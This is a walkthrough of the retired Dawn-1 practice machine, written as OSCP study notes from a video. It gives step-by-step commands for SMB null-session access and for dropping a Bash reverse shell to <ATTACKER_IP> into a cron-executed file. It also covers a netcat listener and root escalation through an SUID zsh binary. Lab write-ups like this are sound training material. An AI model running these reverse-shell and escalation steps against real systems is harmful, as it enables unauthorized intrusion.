This walkthrough focuses on the retired HackTheBox/PG-Play machine **Dawn-1**, which is an excellent learning target for the **Offensive Security Certified Professional (OSCP)** exam.

The machine was compromised using a two-stage approach: **SMB Null Session Access** combined with **Cron Job Exploitation** for initial access, followed by **SUID Binary Exploitation** for root privilege escalation.

***

## 📝 Comprehensive Notes

### 1. Initial Access: SMB and Cron Job Exploitation
The core vulnerability was an exposed **Server Message Block (SMB)** share that allowed **anonymous read and write access**.

| Topic | Key Finding/Concept | Timestamp |
| :--- | :--- | :--- |
| **Ports** | Standard services discovered: **HTTP (80)**, **NetBIOS SSN (139)**, **SMB (445)**, **MySQL (3306)**. | [[01:28](http://www.youtube.com/watch?v=gYEsaerbIXw&t=88)] |
| **Web Enumeration** | Directory fuzzing revealed an accessible path: `/logs`. Checking for `robots.txt`, `.svn`, and `.ds_store` was part of the standard checklist. | [[05:37](http://www.youtube.com/watch?v=gYEsaerbIXw&t=337)] |
| **SMB Shares** | Enumeration revealed the **`IT Dept`** share. Log analysis (implied from the logs or prior knowledge) suggested a cleanup/execution cron job targeting files in this share, specifically mentioning **`web-control`** and a `ch mod 777` operation. | [[09:12](http://www.youtube.com/watch?v=gYEsaerbIXw&t=552)], [[07:49](http://www.youtube.com/watch?v=gYEsaerbIXw&t=469)] |
| **Exploitation** | The strategy was to leverage the **anonymous write permission** on the share to upload a **reverse shell payload** named after the file the cron job was expected to execute. The system would then execute our payload as the user running the cron job (likely **don**). | [[11:13](http://www.youtube.com/watch?v=gYEsaerbIXw&t=673)], [[14:37](http://www.youtube.com/watch?v=gYEsaerbIXw&t=877)] |
| **Valid Users** | Two valid users were identified during enumeration: **`don`** (from the home directory path in logs) and **`ganymede`** (from `enum4linux`). | [[09:16](http://www.youtube.com/watch?v=gYEsaerbIXw&t=556)], [[11:33](http://www.youtube.com/watch?v=gYEsaerbIXw&t=693)] |

***

### 2. Privilege Escalation: SUID Binary
Post-exploitation enumeration revealed a specific misconfiguration that allowed for a direct jump to root.

| Topic | Key Finding/Concept | Timestamp |
| :--- | :--- | :--- |
| **Local Enumeration** | Standard checks included: `sudo -l`, checking for interesting files in `/etc`, `/var/mail`, and world-writable locations (`/tmp`, `/dev/shm`). | [[16:34](http://www.youtube.com/watch?v=gYEsaerbIXw&t=994)], [[20:07](http://www.youtube.com/watch?v=gYEsaerbIXw&t=1207)] |
| **Rabbit Hole** | The `sudo -l` output allowed running **`/usr/bin/mysql`** as `sudo`. Attempting the standard GTFObins exploit for Sudo MySQL resulted in an `Access denied` error, indicating it was likely a dead end. | [[17:41](http://www.youtube.com/watch?v=gYEsaerbIXw&t=1061)] |
| **Final Exploit** | A search for **SUID (Set User ID)** binaries revealed that the **`zsh`** (Z-Shell) binary had the SUID bit set. An SUID bit on a shell binary allows any user to execute it with the permissions of the file's owner (which was **root**), granting an immediate root shell. | [[24:58](http://www.youtube.com/watch?v=gYEsaerbIXw&t=1498)], [[26:14](http://www.youtube.com/watch?v=gYEsaerbIXw&t=1574)] |

***

## 💻 Essential Commands

### Stage 1: Initial Enumeration & Shell Upload

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `nmap -p- --sc -sv <TARGET_IP>` | Full TCP port scan with service detection and default scripts. | [[00:09](http://www.youtube.com/watch?v=gYEsaerbIXw&t=9)] |
| `nmap -p139,445 --script=smb-enum-shares <TARGET_IP>` | Enumerate accessible SMB shares. | [[08:17](http://www.youtube.com/watch?v=gYEsaerbIXw&t=497)] |
| `enum4linux <TARGET_IP>` | Comprehensive SMB/Samba enumeration, which helped find valid user `ganymede`. | [[09:33](http://www.youtube.com/watch?v=gYEsaerbIXw&t=573)] |
| `smbclient //<TARGET_IP>/IT\ Dept -N` | Access the writable `IT Dept` share using a null session. | [[10:55](http://www.youtube.com/watch?v=gYEsaerbIXw&t=655)] |
| `touch web-control` | Create the local file named to match the expected cron job file. | [[12:20](http://www.youtube.com/watch?v=gYEsaerbIXw&t=740)] |
| `echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/9090 0>&1"' > web-control` | Write a Bash reverse shell payload into the file. | [[12:50](http://www.youtube.com/watch?v=gYEsaerbIXw&t=770)] |
| `nc -lvnp 9090` | Set up the Netcat listener on the attacking machine. | [[13:27](http://www.youtube.com/watch?v=gYEsaerbIXw&t=807)] |
| `put web-control` | Upload the reverse shell payload into the share (from inside `smbclient`). | [[14:41](http://www.youtube.com/watch?v=gYEsaerbIXw&t=881)] |

### Stage 2: Post-Exploitation & Privilege Escalation

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Spawn a TTY shell for better interaction. | [[15:29](http://www.youtube.com/watch?v=gYEsaerbIXw&t=929)] |
| `export TERM=xterm-256color` | Set environment variables for better shell features (e.g., clear screen). | [[15:37](http://www.youtube.com/watch?v=gYEsaerbIXw&t=937)] |
| `stty -echo` followed by `fg` | Stabilize the shell (after hitting Ctrl+Z to background the process). | [[15:51](http://www.youtube.com/watch?v=gYEsaerbIXw&t=951)] |
| `sudo -l` | Check if the current user has `sudo` privileges. | [[16:34](http://www.youtube.com/watch?v=gYEsaerbIXw&t=994)] |
| `find / -perm -4000 2>/dev/null` | Find files with the **SUID** bit set across the entire file system (the correct, thorough command). | [[24:18](http://www.youtube.com/watch?v=gYEsaerbIXw&t=1458)] (Implied) |
| `zsh` | Execute the SUID-enabled Z-Shell to immediately gain a root shell. | [[26:30](http://www.youtube.com/watch?v=gYEsaerbIXw&t=1590)] |

***

### 🧠 OSCP Takeaways

1.  **Be Thorough on SMB:** Always enumerate shares using both `nmap` and `enum4linux`, and test for anonymous access with `smbclient -N`. Anonymous R/W access on a share is a massive misconfiguration.
2.  **Web Fuzzing is Crucial:** Directory and file fuzzing can reveal hidden, misconfigured paths like `/logs` that contain vital clues (users, processes, paths).
3.  **Cron is King:** If you find a writable directory, check if logs/enumeration hint at any scheduled jobs (cron jobs) that interact with that directory. This is a common path for initial access or vertical privilege escalation.
4.  **SUID/SGID Checklist:** After gaining an initial shell, always perform the SUID/SGID check as it's the fastest path to root. Be wary of rabbit holes like the MySQL Sudo exploit that can waste time.

**Video Link:** [Dawn-1 (PG-Play) - with S1REN !](http://www.youtube.com/watch?v=gYEsaerbIXw)

http://googleusercontent.com/youtube_content/0